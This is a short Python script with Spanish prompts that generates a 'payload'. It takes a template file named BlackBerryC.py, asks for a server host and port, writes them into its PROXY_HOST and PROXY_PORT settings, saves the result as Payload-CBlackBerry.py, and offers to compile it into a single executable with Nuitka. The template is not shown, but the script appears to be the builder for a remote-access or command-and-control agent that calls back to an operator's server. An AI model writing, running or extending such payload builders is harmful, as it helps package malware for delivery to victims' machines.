#!/usr/bin/env python3
import os
import re
import subprocess
import sys

TEMPLATE_PATH = "BlackBerryC.py"

def generate_payload():
    if not os.path.isfile(TEMPLATE_PATH):
        print(f"Error: no existe '{TEMPLATE_PATH}'")
        sys.exit(1)

    host = input("Host del servidor: ").strip()
    port_str = input("Puerto del servidor: ").strip()
    try:
        port = int(port_str)
    except ValueError:
        print("Puerto inválido")
        sys.exit(1)

    salida = input("Nombre de salida (ENTER para 'Payload-CBlackBerry.py'): ").strip() or "Payload-CBlackBerry.py"

    # Leer el archivo original
    with open(TEMPLATE_PATH, "r") as f:
        code = f.read()

    # Reemplazar PROXY_HOST y PROXY_PORT
    code = re.sub(
        r"PROXY_HOST\s*=\s*['\"].*?['\"]",
        f"PROXY_HOST = '{host}'",
        code
    )
    code = re.sub(
        r"PROXY_PORT\s*=\s*\d+",
        f"PROXY_PORT = {port}",
        code
    )

    # Guardar el nuevo payload
    try:
        with open(salida, "w") as f:
            f.write(code)
        print(f"[+] Payload generado: {salida}")
    except Exception as e:
        print(f"Error al escribir '{salida}': {e}")
        sys.exit(1)

    # Preguntar por compilación con Nuitka
    if input("¿Compilar con Nuitka? (s/N): ").strip().lower() == "s":
        try:
            print("[*] Compilando con Nuitka…")
            subprocess.run(
                ["nuitka3", "--onefile", salida],
                check=True
            )
            print("[+] Compilación completada.")
        except subprocess.CalledProcessError as e:
            print(f"Error al compilar: {e}")

if __name__ == "__main__":
    generate_payload()
